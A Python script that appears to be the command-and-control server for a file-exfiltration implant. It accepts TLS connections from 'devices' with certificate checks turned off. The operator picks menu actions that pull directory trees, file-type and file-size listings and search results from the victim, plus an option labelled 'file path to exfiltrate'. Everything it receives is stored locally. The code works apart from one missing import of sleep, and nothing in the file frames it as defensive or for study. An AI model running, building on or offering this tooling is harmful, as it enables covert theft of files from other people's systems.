#!/usr/bin/env python3

import os
import socket
import ssl
from datetime import datetime
import logging
import argparse

# Constants
BUFFER_SIZE = 1024
DATA_DIR = './Source/data/'
ACTIONS = {
    1: "Get Tree",
    2: "Filetypes",
    3: "Filesize",
    4: "Search",
    5: "Download File",
    6: "Close"
}

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def setup_ssl_context(cert_file, key_file, ca_file):
    """
    Setup SSL context for server.
    :param cert_file: Path to SSL certificate file
    :param key_file: Path to SSL private key file
    :param ca_file: Path to CA certificate file
    :return: SSLContext object
    """
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile=cert_file, keyfile=key_file)
    context.load_verify_locations(ca_file)
    context.check_hostname = False  # Disable hostname checking
    context.verify_mode = ssl.CERT_NONE  # Disable certificate verification
    return context

def receive_data(conn, filename):
    """
    Receive data from client and save to file.
    :param conn: Client connection socket
    :param filename: Filename to save received data
    """
    os.makedirs(DATA_DIR, exist_ok=True)
    with open(os.path.join(DATA_DIR, filename), 'wb') as f:
        while True:
            data = conn.recv(BUFFER_SIZE)
            if data == b"!":
                break
            f.write(data)

def handle_client(conn, addr):
    """
    Handle client connection.
    :param conn: Client connection socket
    :param addr: Client address
    """
    logging.info(f"Device {addr} connected.")
    try:
        while True:
            print("\nList of actions: \n1. Get Tree \n2. Filetypes\n3. Filesize\n4. Search\n5. Download File\n6. Close\n")
            action = int(input("Enter action code: "))

            if action not in ACTIONS:
                logging.error("Invalid action code.")
                continue

            conn.sendall(action.to_bytes(1, byteorder='big'))

            if action == 1:
                logging.info("Receiving Tree Data")
                filename = f"tree_{datetime.now().strftime('%d_%m_%Y')}.txt"
                receive_data(conn, filename)

            elif action == 2:
                logging.info("Receiving Filetypes Data")
                filename = f"type_{datetime.now().strftime('%d_%m_%Y')}.txt"
                receive_data(conn, filename)

            elif action == 3:
                logging.info("Receiving Filesize Data")
                filename = f"size_{datetime.now().strftime('%d_%m_%Y')}.txt"
                receive_data(conn, filename)

            elif action == 4:
                search_string = input("Enter search string: ")
                conn.sendall(search_string.encode())
                filename = f"search_{datetime.now().strftime('%d_%m_%Y')}.txt"
                receive_data(conn, filename)

            elif action == 5:
                file_path = input("Enter file path to exfiltrate: ")
                conn.sendall(file_path.encode())
                logging.info("File exfiltration started.")
                sleep(10)  # Wait for the client to complete exfiltration

            elif action == 6:
                break

    except Exception as e:
        logging.error(f"Error handling client {addr}: {e}")
    finally:
        conn.close()
        logging.info(f"Device {addr} disconnected.")

def main():
    parser = argparse.ArgumentParser(description='SSL Server')
    parser.add_argument('-H', '--host', default='0.0.0.0', help='Hostname or IP address to bind the server')
    parser.add_argument('-P', '--port', type=int, default=65432, help='Port number to bind the server')
    parser.add_argument('-C', '--cert', default='./Source/cert/server-cert.pem', help='Path to the SSL certificate file')
    parser.add_argument('-K', '--key', default='./Source/cert/server-key.pem', help='Path to the SSL private key file')
    parser.add_argument('--ca-cert', default='./Source/cert/ca-cert.pem', help='Path to the CA certificate file')
    args = parser.parse_args()

    context = setup_ssl_context(args.cert, args.key, args.ca_cert)
    
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((args.host, args.port))
        s.listen()
        logging.info(f"Server listening on {args.host}:{args.port}")
        
        with context.wrap_socket(s, server_side=True) as ssock:
            while True:
                logging.info("Waiting for new device")
                conn, addr = ssock.accept()
                handle_client(conn, addr)

if __name__ == "__main__":
    main()
